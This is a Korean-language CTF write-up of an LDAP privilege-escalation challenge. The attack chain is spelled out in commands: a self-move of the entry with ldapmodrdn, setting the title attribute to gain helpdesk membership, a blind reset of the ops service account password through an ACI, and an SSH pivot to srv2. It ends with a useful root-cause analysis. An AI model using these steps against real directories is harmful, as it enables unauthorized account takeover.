# Self-service — DevSecOops / LDAP (101 solves)
- solved by @cooku222
**문제:** Self-service
**카테고리:** DevSecOops / ldap
**점수:** 82
**주어진 계정:** `ereid:Summer2026`
**접속 방법:**
```
ssh -o ProxyCommand='openssl s_client -quiet -connect %h:%p' ereid@HOST -p 1337
```

## 요약 (TL;DR)

계약직 계정(`ereid`)에게 자기 자신의 LDAP 디렉토리 속성만 수정할 수 있는
"셀프서비스" 권한이 주어진다. 다음을 순서대로 연결(체이닝)하면 낮은 권한의
계약직 계정에서 두 번째 호스트(`srv2`)의 `ops` 서비스 계정까지 권한 상승이
가능하다:

1. `ou=staff`로 자신의 엔트리를 이동시킬 수 있는 과도하게 넓은 `moddn`(이름변경) 권한
2. 사실은 `title` 속성값 하나만으로 결정되는, 잘못 설계된 "자동 프로비저닝" 그룹(`helpdesk`)
3. `helpdesk` 멤버에게 서비스 계정의 비밀번호를 재설정할 수 있게 해주는 ACI
4. 점프박스에만 적용되고 실제 타깃 호스트에는 적용되지 않는 `DenyUsers` 규칙

플래그는 `srv2`의 `~/flag.txt`에 있다.

**플래그:**
```
NNS{4_j0B_ti713_15_No7_4n_4cce55_coNtR0l_boUNDaRY_anD_4Pp4ren7ly_tHer3_4R3_4Ctua1_or6s_7Hat_D0_stUp1D_sh17_l1ke_7h1s}
```

---

## 1. 접속하기

문제는 TLS로 터널링된 SSH를 노출한다. Windows에서는 몇 가지 도구 문제를 해결해야 했다:

- PowerShell은 작은따옴표로 감싼 `ProxyCommand`를 POSIX 셸과 똑같이 파싱하지 않는다.
- `openssl`이 설치되어 있지 않거나 `PATH`에 없었고, `winget install --id=ShiningLight.OpenSSL.Light -e`로
  설치한 뒤에도 Windows OpenSSH 클라이언트(`posix_spawnp`)가 `C:\Program Files\...`
  경로의 공백 때문에 실행을 실패시켰다.
- 해결책: `openssl s_client` 대신 이미 설치되어 `PATH`에 잡혀있던 (Nmap의) `ncat --ssl`을
  `ProxyCommand`로 사용:

```powershell
ssh -o ProxyCommand="ncat --ssl %h %p" ereid@self-service-<id>.chall.nnsc.tf -p 1337
```

`ereid` / `Summer2026`으로 로그인하면 (bash가 아니라) **PowerShell 7** 셸이 떨어지며,
커스텀 PowerShell 모듈이 자동으로 로드되어 있다:

```
PowerShell 7.4.6
  Directory self-service loaded. Get-Command -Module SelfService
```

## 2. 정찰 — `SelfService` 모듈

```powershell
Get-Command -Module SelfService
```

```
Function  Get-MyDirectoryEntry
Function  Get-MyDn
Function  Set-MyDirectoryAttribute
```

각 함수의 `Definition`을 확인하고(결국 `/opt/corp/SelfService.psm1`에서 소스 파일 자체를
찾아냄), 전체 그림이 드러났다:

```powershell
$script:Base   = 'dc=corp,dc=nns'
$script:Uri    = 'ldap://dir:3389'
$script:GerOid = '1.3.6.1.4.1.42.2.27.9.5.2'   # OpenLDAP "Get Effective Rights" 컨트롤

function Get-MyDn {
    param([string]$Uid = $env:USER)
    $out = & ldapsearch -x -LLL -H $script:Uri -b $script:Base "(uid=$Uid)" dn 2>$null
    foreach ($line in $out) { if ($line -like 'dn: *') { return $line.Substring(4).Trim() } }
    throw "No directory entry for '$Uid'."
}

function Get-MyDirectoryEntry {
    param([switch]$RightsOnly)
    $dn = Get-MyDn
    $pw = (Get-DirectoryCredential).GetNetworkCredential().Password
    # ldapsearch ... -E "!$GerOid=:dn: $dn" '(objectClass=*)' '*'
}

function Set-MyDirectoryAttribute {
    param([string]$Name, [string]$Value)
    $dn = Get-MyDn
    $pw = (Get-DirectoryCredential).GetNetworkCredential().Password
    # ldapmodify로 자신의 엔트리($dn)의 $Name 속성을 교체
}
```

두 가지가 눈에 띈다:

- `Get-MyDn -Uid <값>`은 **아무런 검증 없이** LDAP 필터를 조립한다 — 전형적인
  LDAP 인젝션 지점 (이번 풀이의 최종 경로는 아니었지만 주목할 만하다).
- `Set-MyDirectoryAttribute`는 항상 인자 없이 `Get-MyDn`을 호출하므로 항상 **본인의
  DN**으로만 귀결된다 — 오직 자기 엔트리만 수정 가능하지만, *어떤* 속성을 *어떤* 값으로
  바꿀지는 완전히 자유롭다.

## 3. 셀프서비스 권한 확인

OpenLDAP의 GetEffectiveRights 컨트롤(OID `1.3.6.1.4.1.42.2.27.9.5.2`)을 이용하면
자기 엔트리에서 어떤 속성을 읽기/검색/비교/쓰기 할 수 있는지 정확히 알 수 있다:

```powershell
$dn = Get-MyDn
$pw = Read-Host "Directory password"
ldapsearch -x -LLL -o ldif-wrap=no -H ldap://dir:3389 -D $dn -w $pw -b $dn -s base `
  -E "!1.3.6.1.4.1.42.2.27.9.5.2=:dn: $dn" '(objectClass=*)' '*'
```

> 참고: `-o ldif-wrap=no`를 지정하지 않으면 `ldapsearch`의 기본 76컬럼 LDIF 줄바꿈과
> PowerShell의 `Get-Content`/터미널 렌더링이 겹쳐서 긴 속성 목록이 잘리거나 깨진
> 것처럼 보인다. 권한을 확인할 때는 항상 줄바꿈을 꺼야 한다.

시작 엔트리: `uid=ereid,ou=contractors,dc=corp,dc=nns`

`attributeLevelRights`에서 나온 주요 결과:

| 속성 | 권한 | 비고 |
|---|---|---|
| `sn`, `title`, `displayName`, `givenName`, `loginShell`, `uid`, ... | `rscwo` (읽기/검색/비교/**쓰기/폐기**) | 자유롭게 수정 가능 |
| `uidNumber`, `gidNumber`, `homeDirectory`, `memberOf` | `rsc` (읽기전용) | UID=0으로 바로 상승 불가 |
| `userPassword` | `none` | 자신의 비밀번호조차 이 방식으로는 못 바꿈 |

즉 "`uidNumber=0`으로 설정"하는 단순한 권한 상승은 막혀 있다. 다른 경로가 필요하다.

## 4. 상승 경로 찾기: `onboarding-agents` 그룹

```powershell
ldapsearch -x -LLL -H ldap://dir:3389 -D $dn -w $pw -b "ou=groups,dc=corp,dc=nns" dn cn description
```

```
dn: cn=onboarding-agents,ou=groups,dc=corp,dc=nns
description: Contractor onboarding coordinators. May move contractor accounts
 into ou=staff when they convert to permanent.
member: uid=swalsh,ou=contractors,dc=corp,dc=nns
member: uid=ereid,ou=contractors,dc=corp,dc=nns
```

`ereid`는 `onboarding-agents`의 멤버이며, 이 그룹의 *설명*에는 계약직 계정을
`ou=staff`로 옮길 권한이 있다고 되어 있다. `ou=staff`에 대한 유효 권한을 확인하면
`entryLevelRights: n`(moddn/rename 권한)이 실제로 있음을 확인할 수 있다:

```powershell
ldapsearch -x -LLL -H ldap://dir:3389 -D $dn -w $pw -b "ou=staff,dc=corp,dc=nns" -s base `
  -E "!1.3.6.1.4.1.42.2.27.9.5.2=:dn: $dn" objectClass entryLevelRights
# entryLevelRights: n
```

따라서 `ereid`는 `ldapmodrdn`으로 **자기 자신의 엔트리**를 `ou=staff`로
옮길 수 있다:

```powershell
ldapmodrdn -x -H ldap://dir:3389 -D $dn -w $pw -r -s "ou=staff,dc=corp,dc=nns" `
  "uid=ereid,ou=contractors,dc=corp,dc=nns" "uid=ereid"
```

성공 — 이제 `Get-MyDn`은 `uid=ereid,ou=staff,dc=corp,dc=nns`를 반환한다.

> 이 이동 자체만으로는 새로운 *속성* 권한이 생기지 않고(ACI는 여전히
> 엔트리 단위/본인 한정), Unix `id`/`groups`도 변하지 않는다(nsswitch는
> `passwd`만 LDAP을 거치고 `group`은 안 거침). 하지만 5단계의 전제 조건이며,
> 비교 대상이었던 다른 `ou=staff` 멤버들과 동일한 조건을 맞춰준다.

## 5. `title` 속성으로 자동 프로비저닝되는 `helpdesk` 그룹

```powershell
ldapsearch -x -LLL -H ldap://dir:3389 -D $dn -w $pw -b "cn=helpdesk,ou=groups,dc=corp,dc=nns" '(objectClass=*)' '*'
```

```
dn: cn=helpdesk,ou=groups,dc=corp,dc=nns
description: First-line IT support. Members are provisioned automatically from HR attributes.
member: uid=agrant,ou=staff,dc=corp,dc=nns
member: uid=cnovak,ou=staff,dc=corp,dc=nns
member: uid=pdelgado,ou=staff,dc=corp,dc=nns
```

일반 정적 `groupOfNames`다 — 외부의 어떤 자동화가 HR 속성을 기준으로 멤버십을
동기화하는 것으로 보인다. 실제 세 멤버의 속성을 확인해보면:

```powershell
ldapsearch -x -LLL -H ldap://dir:3389 -D $dn -w $pw -b "uid=agrant,ou=staff,dc=corp,dc=nns" title departmentNumber
ldapsearch -x -LLL -H ldap://dir:3389 -D $dn -w $pw -b "uid=cnovak,ou=staff,dc=corp,dc=nns" title departmentNumber
ldapsearch -x -LLL -H ldap://dir:3389 -D $dn -w $pw -b "uid=pdelgado,ou=staff,dc=corp,dc=nns" title departmentNumber
```

셋 다 `title: Platform Engineer`를 공통으로 갖고 있다(`departmentNumber`는 서로 다름).
`title`은 `ereid`가 자유롭게 쓸 수 있는(`rscwo`) 속성 중 하나였다. 그러므로:

```powershell
Set-MyDirectoryAttribute -Name title -Value "Platform Engineer"
```

잠시 후 그룹 멤버십을 다시 확인:

```powershell
ldapsearch -x -LLL -H ldap://dir:3389 -D $dn -w $pw -b "cn=helpdesk,ou=groups,dc=corp,dc=nns" member
```

```
member: uid=agrant,...
member: uid=cnovak,...
member: uid=pdelgado,...
member: uid=ereid,ou=staff,dc=corp,dc=nns   <-- 자동으로 추가됨
```

확인 완료: 외부 자동화가 `title=Platform Engineer` 값을 감시해서 `helpdesk`
그룹 멤버십을 동기화하고 있다 — "자기 자신이 수정 가능한 속성으로부터
인가(authorization) 결정을 내리는" 전형적인 취약점이다.

## 6. `helpdesk` ACI를 이용해 `ops` 서비스 계정 공격

디렉토리 전체 트리를 덤프해보면(`ldapsearch -b "dc=corp,dc=nns" "(objectClass=*)" dn objectClass`)
`uid=ops,ou=staff,dc=corp,dc=nns`라는 서비스 계정이 있으며, `gecos`에 흥미로운
내용이 있다: *"Operations service account (backup/restore on srv2)"*.

`ereid`가 이제 `helpdesk` 멤버가 되었으니, 이 엔트리에 대한 유효 권한을
확인해보면 명시적인 ACI가 발견된다:

```
aci: (targetattr = "userPassword")(version 3.0;
     acl "Helpdesk resets service account passwords";
     allow (write) groupdn = "ldap:///cn=helpdesk,ou=groups,dc=corp,dc=nns";)
attributeLevelRights: ... userPassword:wo ...
```

`helpdesk` 멤버는 `ops` 계정의 `userPassword`를 **blind write**(`wo` = write-only,
읽어올 수는 없음)할 수 있다. 재설정:

```powershell
$ldif = "dn: uid=ops,ou=staff,dc=corp,dc=nns`nchangetype: modify`nreplace: userPassword`nuserPassword: Password123!`n"
$ldif | ldapmodify -x -H ldap://dir:3389 -D $dn -w $pw
```

LDAP 계층에서만 순수하게 새 자격증명이 유효한지 확인:

```powershell
ldapwhoami -x -H ldap://dir:3389 -D "uid=ops,ou=staff,dc=corp,dc=nns" -w "Password123!"
# dn: uid=ops,ou=staff,dc=corp,dc=nns   <- 성공
```

## 7. 점프박스에서의 막다른 길

`ops` 자격증명을 지금 접속 중인 호스트(점프박스)에서 실제로 사용하려 하면
두 가지 방식으로 모두 막힌다:

- **SSH 로그인 자체가 완전히 차단됨.** `/etc/ssh/sshd_config.d/20-role.conf`에
  다음이 있다:
  ```
  DenyUsers ops
  ```
  (최근에 수정된, 14바이트짜리 파일이다 — 방어적/자동화된 대응이거나, 아니면
  이 호스트에만 국한된 의도된 함정일 수 있다.)

- **`su - ops`는 PAM/비밀번호 에러가 아니라 capability 에러로 실패한다:**
  ```
  su: cannot set groups: Operation not permitted
  ```
  `/proc/self/status`를 보면 `CapEff: 0000000000000000` — 점프박스 컨테이너는
  `CAP_SETGID`(및 관련 capability들)가 제거되어 있어서, setuid-root인 `su`
  바이너리조차 `setgroups()`를 호출할 수 없다. 이건 우회해야 할 취약점이 아니라
  컨테이너 하드닝 조치이며, 여기서는 막다른 길이다.

## 8. `srv2`로 피벗

점프박스의 `/etc/hosts`(Kubernetes가 관리)에는 추가 내부 호스트들이 보인다:

```
172.20.195.21   dir
172.20.98.134   jump
172.20.154.6    srv2
```

`gecos`의 힌트("backup/restore **on srv2**")와, `DenyUsers ops`가 *이* 호스트에만
존재한다는 사실을 종합하면 `ops`는 다른 곳에서 로그인하도록 의도된 계정임을
강하게 시사한다. 점프박스에서:

```bash
ssh ops@srv2
# 비밀번호: Password123!
```

성공한다 — `srv2`의 sshd 설정에는 그런 제한이 없다.

## 9. 플래그

```bash
ops@srv2:~$ ls -la
-r-------- 1 ops corp 117 Sep  5 10:07 flag.txt

ops@srv2:~$ cat flag.txt
NNS{4_j0B_ti713_15_No7_4n_4cce55_coNtR0l_boUNDaRY_anD_4Pp4ren7ly_tHer3_4R3_4Ctua1_or6s_7Hat_D0_stUp1D_sh17_l1ke_7h1s}
```

## 근본 원인 요약

1. **과도하게 넓은 `moddn` 위임** — `onboarding-agents` 그룹이 계약직 계정을
   OU 간에 이동시킬 수 있어서, 그 계정에 적용되는 정책 자체가 바뀔 수 있었다.
2. **자기 수정 가능한 속성으로 인가를 결정** — `helpdesk` 그룹 멤버십이
   `title`로부터 파생되는데, 이 속성은 "셀프서비스" 기능을 통해 사용자
   본인이 직접 바꿀 수 있었다.
3. **그룹 기반 ACI로 비밀번호 재설정 권한 부여** — `helpdesk` 멤버십이
   다른 계정의 `userPassword`에 대한 쓰기 권한을 부여했는데, 요청자가
   실제로 IT 소속인지 추가 검증이 전혀 없었다.
4. **호스트 간 일관성 없는 접근 제어** — `ops`는 점프박스에서는
   `DenyUsers`로 막혀 있었지만 `srv2`에서는 완전히 허용되어, 호스트 레벨
   제어가 실제로 의도한 경계를 강제하지 못했다.

한마디로: **직함(job title)은 접근 제어 경계가 아니다** — 그런데 실제로
이렇게 설계하는 조직이 있는 모양이다.

## 도구 관련 참고사항 (Windows 한정)

- Windows에서 `openssl`을 `PATH`에 편하게 두기 어려울 때는 `ncat --ssl <host> <port>`가
  `ProxyCommand`로 훌륭한 대안이 된다:
  ```powershell
  ssh -o ProxyCommand="ncat --ssl %h %p" user@host -p 1337
  ```
- 나중에 파싱/읽기를 위해 출력을 저장할 때는 항상 `ldapsearch`에 `-o ldif-wrap=no`를
  줘야 한다 — 기본 LDIF 줄바꿈과 터미널 렌더링이 겹치면 긴 속성 목록이 잘리거나
  깨진 것처럼 보일 수 있다.
- 커스텀 PowerShell 모듈에서 `Get-Credential` 기반 캐싱(`$script:Cred`)은 한 번
  잘못된 자격증명이 들어가면 세션 내내 "고정"될 수 있다; 재접속이 가장 간단한
  해결책이다.
